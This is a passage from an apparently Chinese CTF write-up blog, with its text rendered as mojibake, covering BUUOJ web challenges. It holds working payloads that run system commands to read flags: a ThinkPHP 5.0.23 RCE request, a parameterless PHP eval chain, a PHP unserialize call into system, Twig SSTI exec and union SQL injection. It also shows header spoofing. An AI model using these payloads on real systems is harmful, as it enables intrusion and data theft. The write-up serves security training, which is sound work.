<strong>å°†get_headersï¼ˆï¼‰ä¸ç”¨æˆ·æä¾›çš„URLä¸€èµ·ä½¿ç”¨æ—¶</strong>ï¼Œå¦‚æœURLåŒ…å«é›¶ï¼ˆ\ 0ï¼‰å­—ç¬¦ï¼Œåˆ™URLå°†è¢«é™é»˜åœ°<strong>æˆªæ–­</strong>ã€‚<strong>è¿™å¯èƒ½ä¼šå¯¼è‡´æŸäº›è½¯ä»¶å¯¹get_headersï¼ˆï¼‰çš„ç›®æ ‡åšå‡ºé”™è¯¯çš„å‡è®¾ï¼Œå¹¶å¯èƒ½å°†æŸäº›ä¿¡æ¯å‘é€åˆ°é”™è¯¯çš„æœåŠ¡å™¨ã€‚</strong> </p><p>é¢˜ç›®è®²æ˜ä¸ºCVEï¼Œæ’é™¤SSRF</p><p>åœ¨å“åº”å¤´ä¸­å‘ç°hint</p><img src="/article/Buuoj-WEB-Write-up/image-20201208195802041.png" class="" title="image-20201208195802041" loading="lazy"><p>è®¿é—®<code>./?url=http://localhost%00www.ctfhub.com</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208195922474.png" class="" title="image-20201208195922474" loading="lazy"><p><code>Tips: Host must be end with &#39;123&#39;</code></p><p>è®¿é—®<code>./?url=http://127.0.0.123%00www.ctfhub.com</code>å³å¯</p><img src="/article/Buuoj-WEB-Write-up/image-20201208200037696.png" class="" title="image-20201208200037696" loading="lazy"><p>ä¸»è¦è€ƒä¸€ä¸ªCVEï¼Œè®°å½•ä¸€ä¸‹</p><hr><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>gitæ³„éœ²</p><p>ä¸€ç‚¹æç¤ºéƒ½æ²¡æœ‰ï¼å¯æ¶</p><p><code>robots.txt</code>æ²¡æœ‰ï¼Œå“åº”å¤´æ²¡æœ‰ï¼Œéšæ‰‹è®¿é—®äº†ä¸ª<code>./.git/</code>ç»“æœçœŸæœ‰ï¼Œç›´æ¥ä¸ŠGitHack</p><img src="/article/Buuoj-WEB-Write-up/image-20201208202421537.png" class="" title="image-20201208202421537" loading="lazy"><p>å¼ºçƒˆè°´è´£ï¼GitHacké‡æ–°ä¸‹ä¸ªå°±å¥½äº†ï¼Œæ—§çš„è¿™ä¸ªè¿˜ä¸ç®¡ç”¨ï¼ŒGitHackè¿˜æœ‰å‡çš„ï¼Ÿï¼Ÿï¼Ÿ</p><img src="/article/Buuoj-WEB-Write-up/image-20201208203755631.png" class="" title="image-20201208203755631" loading="lazy"><p>å¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>å¾ˆå¥½ï¼Œçœ‹åˆ°è¿™ä¸ª<code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]</code>å¦¥å¦¥çš„æ— å‚æ•°RCE</p><p>è¿‡æ»¤ä¸€å †</p><p>å…ˆæ‰«å½“å‰ç›®å½•</p><p>payload=<code>./?exp=print_r(scandir(current(localeconv())));</code></p><pre class="language-shell" data-language="shell"><code class="language-shell">localeconv(): è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å¦‚ä¸‹å›¾current(): å–æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒã€‚current(localeconv()): å–ç¬¦å·.scandir(): æ‰«æç›®å½•scandir(current(localeconv()))ï¼š ç­‰åŒäºscandir(.)ï¼Œå³æ‰«æå½“å‰ç›®å½•print_r()ï¼š è¾“å‡º</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208205457822.png" class="" title="image-20201208205457822" loading="lazy"><p>localeconv()å¦‚å›¾æ‰€ç¤º</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205704606.png" class="" title="image-20201208205704606" loading="lazy"><p>current(localeconv())å–åˆ°äº†ç¬¦å·.</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205956327.png" class="" title="image-20201208205956327" loading="lazy"><p>å‘ç°äº†flag.php</p><p>ä¸‹é¢è¦å–flag.phpä¸­çš„å†…å®¹ï¼Œflag.phpåœ¨å€’æ•°ç¬¬äºŒç»„</p><p>ç”±äºæ²¡æœ‰ç¦ç”¨sessionï¼Œåˆ©ç”¨session<del>ï¼ˆæˆ‘æœ€å–œæ¬¢</del></p><img src="/article/Buuoj-WEB-Write-up/image-20201208210427209.png" class="" title="~" loading="lazy"><p>å…¶ä»–æ–¹æ³•</p><p>payload=<code>./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></p><pre class="language-none"><code class="language-none">array_flip()ï¼š äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼array_rand()ï¼š ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒreadfile()ï¼š è¯»æ–‡ä»¶</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208211502701.png" class="" title="image-20201208211502701" loading="lazy"><p>æœ‰ç‚¹å°è¿æ°”å—·ï¼Œå¯ä»¥å†™è„šæœ¬è·‘ï¼Œåæ­£éšæœºå˜›â€¦æ¦‚ç‡é—®é¢˜</p><p>è¯»æºç æ–¹æ³•</p><pre class="language-none"><code class="language-none">file_get_contents()ï¼š æœ¬é¢˜è¢«banview-source:highlight_file()show_source()readfile()</code></pre><hr><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><h5 id="thinkphp5-0-23-è¿œç¨‹ä»£ç æ‰§è¡Œ-æ¼æ´"><a href="#thinkphp5-0-23-è¿œç¨‹ä»£ç æ‰§è¡Œ-æ¼æ´" class="headerlink" title="thinkphp5.0.23 è¿œç¨‹ä»£ç æ‰§è¡Œ æ¼æ´"></a>thinkphp5.0.23 è¿œç¨‹ä»£ç æ‰§è¡Œ æ¼æ´</h5><p>payloadï¼š</p><p>POST</p><pre class="language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</code></pre><hr><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><img src="/article/Buuoj-WEB-Write-up/image-20201210190510038.png" class="" title="image-20201210190510038" loading="lazy"><p>æ‰“å¼€ä¸€ä¼šå‘ç°ç½‘é¡µè‡ªåŠ¨åˆ·æ–°äº†ï¼ŒæŠ“åŒ…çœ‹çœ‹</p><img src="/article/Buuoj-WEB-Write-up/image-20201210190602388.png" class="" title="image-20201210190602388" loading="lazy"><p>è‡ªåŠ¨åˆ·æ–°</p><pre class="language-none"><code class="language-none">setTimeout(&quot;document.form1.submit()&quot;,5000)</code></pre><p>æ€€ç–‘è°ƒç”¨å‡½æ•°ï¼Œå°è¯•ä¼ å‚</p><pre class="language-none"><code class="language-none">func&#x3D;file_get_contents&amp;p&#x3D;index.php</code></pre><p>å¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"shell_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"passthru"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_open"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"show_source"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"popen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"eval"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"touch"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"substr_replace"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_filter"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"array_map"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"filter_var"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uasort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uksort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_reduce"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fopen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fwrite"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>åˆ†æå‘ç°ç¦ç”¨äº†ä¸å°‘å‡½æ•°ï¼Œè°ƒç”¨äº†<code>call_user_func()</code>å‡½æ•°ï¼Œå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œã€‚</p><p><code>gettype()</code>å‡½æ•°é™åˆ¶æ‰§è¡Œåè¿”å›å¿…é¡»ä¸ºStringç±»å‹ã€‚</p><p>è§‚å¯Ÿå‘ç°ï¼Œæœ¬é¢˜åªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸€æ¬¡wafï¼Œä»£ç ä¸­è¿˜ç»™äº†ä¸ªç±»Testï¼Œç±»ä¸­è°ƒç”¨<code>gettime()</code>å‡½æ•°ä¸ä¼šè¢«wafï¼Œäºæ˜¯å¯ç”¨åºåˆ—åŒ–æ–¹æ³•ï¼Œå°†ä»£ç åºåˆ—åŒ–ä¼ å…¥ï¼Œå†ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å°è¯•ä¼ å‚</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210191635044.png" class="" title="image-20201210191635044" loading="lazy"><p>å†æ‰«æ ¹ç›®å½•æ–‡ä»¶</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls &#x2F;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210192034277.png" class="" title="image-20201210192034277" loading="lazy"><p>æ ¹ç›®å½•æ²¡å‘ç°flagï¼Œåˆ©ç”¨systemæ¥æ‰¾ä¸€ä¸‹ï¼Œ<code>find / -name fla*</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210192305790.png" class="" title="image-20201210192305790" loading="lazy"><p>å‘ç°äº†å¥‡æ€ªçš„ä¸œè¥¿ï¼Œæ‰“å¼€å³ä¸ºflag</p><img src="/article/Buuoj-WEB-Write-up/image-20201210192428939.png" class="" title="image-20201210192428939" loading="lazy"><p>payloadï¼š</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><hr><h2 id="BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h2><h5 id="Http-Header"><a href="#Http-Header" class="headerlink" title="Http Header"></a>Http Header</h5><p>è€ƒéªŒhttpè¯·æ±‚å¤´ï¼Œæ‰“å¼€éšä¾¿ç™»é™†åº•éƒ¨æºç æç¤º<code>&lt;!-- L0g1n.php --&gt;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210194805424.png" class="" title="image-20201210194805424" loading="lazy"><ol><li>æç¤º<code>Sorry, this site will be available after totally 99 years!</code></li></ol><p>ä¿®æ”¹Cookieä¸­<code>time=9999999999</code></p><ol start="2"><li>æç¤º<code>Sorry, this site is only optimized for those who comes from localhost</code></li></ol><p>æ·»åŠ <code>X-Forwarded-For: 127.0.0.1</code></p><p>æç¤º<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naiveÂ·</code></p><p>æ·»åŠ <code>Client-IP: 127.0.0.1</code></p><ol start="3"><li>æç¤º<code>Sorry, this site is only optimized for those who come from gem-love.com</code></li></ol><p>æ·»åŠ <code>Referer: gem-love.com</code></p><ol start="4"><li>æç¤º<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></li></ol><p>èµ„æ–™ï¼šç§‘æ‘©å¤š64ä½å®‰å…¨æµè§ˆå™¨çš„UAä¸º Commodore 64 </p><p>ä¿®æ”¹<code>User-Agent: Commodore 64</code></p><ol start="5"><li>æç¤º<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li></ol><p>æ·»åŠ <code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ï¿¥100/Month</code></p><ol start="6"><li>æç¤º<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ï¿¥100/Month</code></li></ol><p>æ·»åŠ <code>Via: y1ng.vip</code></p><p>æç¤º</p><pre class="language-none"><code class="language-none">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--&#123;ä¸€æ®µbase64ç¼–ç &#125;--&gt;</code></pre><p>base64è§£ç æ³¨é‡Šå¾—flagï¼Œå¯èƒ½åŸé¢˜è¿™è¾¹åªæ˜¯ç»™ä¸‹ä¸€é¢˜çš„æ–¹å‘ï¼Œæ²¡æœ‰ç›´æ¥ç»™flagï¼Œè¿™è¾¹åšé¢˜ç®€å•åŒ–äº†å§â€¦</p><p>æœ€ç»ˆpayloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>L0g1n<span class="token punctuation">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token punctuation">:</span><span class="token number">26256</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Commodore <span class="token number">64</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> UM_distinctid<span class="token operator">=</span><span class="token number">1762</span>cb225c986d<span class="token operator">-</span><span class="token number">0970</span>f0908a83e6<span class="token operator">-</span><span class="token number">3323766</span><span class="token operator">-</span><span class="token number">144000</span><span class="token operator">-</span><span class="token number">1762</span>cb225ca565<span class="token punctuation">;</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>qo3u19su6i7oha2lte6grem4t6<span class="token punctuation">;</span> time<span class="token operator">=</span><span class="token number">9999999999</span>Connection<span class="token punctuation">:</span> close<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Client<span class="token operator">-</span><span class="token constant">IP</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Referer<span class="token punctuation">:</span> gem<span class="token operator">-</span>love<span class="token punctuation">.</span>comFrom<span class="token punctuation">:</span> root@gem<span class="token operator">-</span>love<span class="token punctuation">.</span>comVia<span class="token punctuation">:</span> y1ng<span class="token punctuation">.</span>vip</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210195920865.png" class="" title="image-20201210195920865" loading="lazy"><hr><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h5 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h5><img src="/article/Buuoj-WEB-Write-up/image-20201213144912657.png" class="" title="image-20201213144912657" loading="lazy"><p>IDæµ‹è¯•ï¼Œä¸æ˜¯SQLæ³¨å…¥ï¼Œæµ‹è¯•<code>&#123;&#123;1+1&#125;&#125;</code></p><p>è¿”å›<code>2</code>ï¼Œç¡®è®¤SSTI</p><img src="/article/Buuoj-WEB-Write-up/image-20201213145018456.png" class="" title="image-20201213145018456" loading="lazy"><p>æ ¹æ®æµç¨‹ï¼Œæµ‹è¯•<code>&#123;&#123;2*'1'&#125;&#125;</code></p><p>è¾“å‡º<code>49</code></p><p>ç¡®è®¤ä¸ºTwigæ¨¡æ¿å¼•æ“</p><p>ç›´æ¥æ‰“Payloadï¼š</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /f*")&#125;&#125;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201213145633846.png" class="" title="image-20201213145633846" loading="lazy"><hr><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>æ³¨å†Œï¼Œç™»é™†ï¼Œå°è¯•SSTIæ²¡æœ‰ï¼Œæœ€ååœ¨å¹¿å‘Šæ ‡é¢˜å¤„å‘ç°SQLæ³¨å…¥</p><p>è¿‡æ»¤<code> </code>,<code>+</code>,<code>or</code>,<code>and</code>ç­‰</p><p>ç©ºæ ¼ç”¨<code>/**/</code>æ›¿æ¢</p><p>å°è¯•çˆ†åˆ—æ•°ï¼Œå¥½å®¶ä¼™ï¼Œ22åˆ—</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>å›æ˜¾ç‚¹åœ¨2,3</p><p>æŸ¥ä¸€ä¸‹æ•°æ®åº“å</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173543614.png" class="" title="image-20201213173543614" loading="lazy"><p>åº“åweb1</p><p>å› ä¸ºbanäº†<code>or</code>,æ‰€ä»¥<code>information_schema</code>,è¿™æ—¶æœ‰<code>mysql.innodb_table_stats</code>ï¼Œmysqlé»˜è®¤æ˜¯å…³é—­InnoDBå­˜å‚¨å¼•æ“ ï¼Œä»… Mysql&gt;5.6.x å¯ä½¿ç”¨</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mariadbé“¾æ¥</a></p><p>æŸ¥è¡¨</p><pre class="language-none"><code 